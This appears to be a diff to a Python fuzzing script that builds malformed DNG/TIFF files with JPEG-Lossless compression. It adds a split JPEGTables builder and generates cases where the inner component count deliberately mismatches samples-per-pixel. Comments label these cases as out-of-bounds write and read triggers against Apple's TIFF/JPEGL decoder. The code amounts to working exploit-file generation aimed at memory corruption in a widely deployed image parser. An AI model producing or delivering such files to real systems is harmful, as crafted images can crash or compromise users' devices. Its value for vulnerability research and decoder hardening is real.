@@ -53,6 +53,7 @@ T_CFA_PATTERN        = 33422
 T_DNG_VERSION        = 50706
 T_DNG_BACKWARD_VER   = 50707
 T_UNIQUE_CAM_MODEL   = 50708
+T_JPEG_TABLES        = 347
 T_BLACK_LEVEL        = 50714
 T_WHITE_LEVEL        = 50717
 T_DEFAULT_SCALE      = 50718
@@ -230,6 +231,82 @@ def build_plain_tiff(width=8, height=8, spp=1, bits=8,
     return b.build()
 
 
+# ========================== Old-style TIFF/JPEG-Lossless (JPEGTables split) ==========================
+
+def build_tiff_jpegl_split(width=64, height=64, spp=1, bits=8, inner_comps=None):
+    """
+    TIFF/JPEG-Lossless using the split-table format (TIFF Tech Note 2):
+      Tag 347 (JPEGTables): SOI + SOF3 + DHT + EOI   (tables only, no scan data)
+      Strip data:           SOI + SOS + scan + EOI
+
+    Some decoders locate the SOF3 frame header exclusively in tag 347 rather
+    than inside the strip.  If our self-contained strip format is rejected,
+    this split format may be accepted by Apple's TIFF/JPEGL decoder.
+
+    inner_comps: Nf in SOF3/SOS (mismatch target when != spp)
+    """
+    if inner_comps is None:
+        inner_comps = spp
+
+    n_cats = bits + 1
+    bits_array = [0] * 16
+    if n_cats <= 16:
+        for k in range(n_cats):
+            bits_array[k] = 1
+        huffval = list(range(n_cats))
+    else:
+        for k in range(15):
+            bits_array[k] = 1
+        bits_array[15] = 2
+        huffval = list(range(17))
+
+    dht_payload  = b'\x00'
+    dht_payload += bytes(bits_array)
+    dht_payload += bytes(huffval)
+
+    # ---- JPEGTables block (tag 347): SOI + SOF3 + DHT + EOI ----
+    tables = bytearray()
+    tables += b'\xff\xd8'                                    # SOI
+    lsof = 8 + 3 * inner_comps
+    tables += b'\xff\xc3' + struct.pack('>H', lsof)
+    tables += struct.pack('>BHH', bits, height, width)
+    tables += struct.pack('>B', inner_comps)
+    for i in range(inner_comps):
+        tables += struct.pack('>BBB', i + 1, 0x11, 0x00)
+    tables += b'\xff\xc4' + struct.pack('>H', 2 + len(dht_payload))
+    tables += dht_payload
+    tables += b'\xff\xd9'                                    # EOI
+
+    # ---- Strip: SOI + SOS + scan data + EOI ----
+    strip = bytearray()
+    strip += b'\xff\xd8'                                     # SOI
+    lsos = 6 + 2 * inner_comps
+    strip += b'\xff\xda' + struct.pack('>H', lsos)
+    strip += struct.pack('>B', inner_comps)
+    for i in range(inner_comps):
+        strip += struct.pack('>BB', i + 1, 0x00)
+    strip += b'\x01\x00\x00'                                 # Ss=1, Se=0, Ah/Al=0
+    n_bits = width * height * inner_comps
+    strip += bytes((n_bits + 7) // 8)                        # all-zero errors (midpoint image)
+    strip += b'\xff\xd9'                                     # EOI
+
+    b = TiffBuilder()
+    b.add_long(T_IMAGE_WIDTH,    width)
+    b.add_long(T_IMAGE_LENGTH,   height)
+    b.add_short_array(T_BITS_PER_SAMPLE, [bits] * spp)
+    b.add_short(T_COMPRESSION,   COMP_JPEG_LOSSLESS)
+    b.add_short(T_PHOTOMETRIC,   PHOTO_RGB if spp >= 3 else PHOTO_MINISBLACK)
+    b.add_short(T_SAMPLES_PER_PIXEL, spp)
+    b.add_long(T_ROWS_PER_STRIP, height)
+    b.add_short(T_PLANAR_CONFIG, 1)
+    b.add_short(T_RESOLUTION_UNIT, 2)
+    b.add_rational(T_X_RESOLUTION, 72, 1)
+    b.add_rational(T_Y_RESOLUTION, 72, 1)
+    b.add_byte_array(T_JPEG_TABLES, bytes(tables))
+    b.add_strip(T_STRIP_OFFSETS, T_STRIP_BYTE_COUNTS, bytes(strip))
+    return b.build()
+
+
 # ========================== JPEG 2000 codestream ==========================
 
 def build_j2k(width, height, csiz, bits=16):
@@ -359,22 +436,27 @@ def build_jpegl(width, height, nf, bits=16):
         s += b'\x11'                   # H_i=1, V_i=1 (1×1 sampling)
         s += b'\x00'                   # Tq=0 (unused for lossless)
 
-    # DHT: one DC table (Tc=0, Th=0) using a unary prefix code.
-    # Each category k is assigned a code of length (k+1):
-    #   cat 0 → 0           (1 bit)
-    #   cat 1 → 10          (2 bits)
-    #   cat 2 → 110         (3 bits)
-    #   ...
-    #   cat (P-1) → 1...10  (P bits)
-    # BITS counts must sum to exactly the number of entries.
-    # For P-bit precision: categories 0..(P-1).
-    n_cats = min(bits, 16)   # number of categories = bit depth (capped at 16)
-    # BITS[i] = number of codes of length (i+1)
-    # Using unary: one code per length 1..n_cats
+    # DHT: one DC table (Tc=0, Th=0).
+    # SSSS (magnitude category) ranges 0..P for P-bit lossless JPEG.
+    # Max prediction error = ±(2^P − 1), which needs SSSS=P.
+    # Previous code used n_cats=P (0..P-1), missing SSSS=P — decoders that
+    # validate DHT completeness before the decode loop reject it (DRAW_FAILED).
+    # Fix: include all P+1 categories.
+    n_cats = bits + 1   # 0..P inclusive
     bits_array = [0] * 16
-    for k in range(n_cats):
-        bits_array[k] = 1          # 1 code of length (k+1)
-    huffval = list(range(n_cats))  # HUFFVAL: categories 0..(n_cats-1)
+    if n_cats <= 16:
+        # Unary prefix: one code per length 1..n_cats
+        for k in range(n_cats):
+            bits_array[k] = 1
+        huffval = list(range(n_cats))
+    else:
+        # P=16 needs 17 categories but BITS[] only supports lengths 1..16.
+        # Assign lengths 1..15 to SSSS 0..14, then two codes at length 16
+        # for SSSS 15 and 16.
+        for k in range(15):
+            bits_array[k] = 1
+        bits_array[15] = 2
+        huffval = list(range(17))
     dht_payload  = b'\x00'                        # Tc=0 (DC), Th=0
     dht_payload += bytes(bits_array)              # BITS[0..15]
     dht_payload += bytes(huffval)                 # HUFFVAL
@@ -655,6 +737,32 @@ def generate_corpus(outdir='corpus'):
                       codec=codec, photometric=photometric, outfile=fname)
         except Exception as e:
             print(f'    [!] {name}: {e}')
+
+    # ---- Old-style TIFF/JPEG-Lossless (JPEGTables tag 347 split format) ----
+    # Alternative decoder path: SOF3 lives in tag 347, strip has only SOS+scan.
+    # Apple's TIFF/JPEGL decoder may accept this format when self-contained strip fails.
+    tiff_jpegl_split_cases = [
+        ('CTRL_split_jpegl_1spp_1nf_8b',
+         build_tiff_jpegl_split(64, 64, spp=1, bits=8, inner_comps=1)),
+        ('CTRL_split_jpegl_3spp_3nf_8b',
+         build_tiff_jpegl_split(64, 64, spp=3, bits=8, inner_comps=3)),
+        # Mismatch: SPP=1 outer, Nf=3 inner → OOB WRITE
+        ('split_jpegl_1spp_3nf_8b',
+         build_tiff_jpegl_split(64, 64, spp=1, bits=8, inner_comps=3)),
+        ('split_jpegl_1spp_4nf_8b',
+         build_tiff_jpegl_split(64, 64, spp=1, bits=8, inner_comps=4)),
+        ('split_jpegl_1spp_16nf_8b',
+         build_tiff_jpegl_split(64, 64, spp=1, bits=8, inner_comps=16)),
+        # Mismatch: SPP=3 outer, Nf=1 inner → OOB READ
+        ('split_jpegl_3spp_1nf_8b',
+         build_tiff_jpegl_split(64, 64, spp=3, bits=8, inner_comps=1)),
+    ]
+    print('\n[*] Old-style TIFF/JPEG-Lossless (JPEGTables tag 347 split format):')
+    for name, data in tiff_jpegl_split_cases:
+        fname = os.path.join(outdir, f'{name}.dng')
+        with open(fname, 'wb') as f:
+            f.write(data)
+        print(f'    {fname}  ({len(data)} bytes)')
 
     # ---- Real camera model DNG (Camera Raw hang bypass hypothesis) ----
     # Hypothesis: Camera Raw hangs because 'FuzzResearch/ImageIOAudit' is unknown
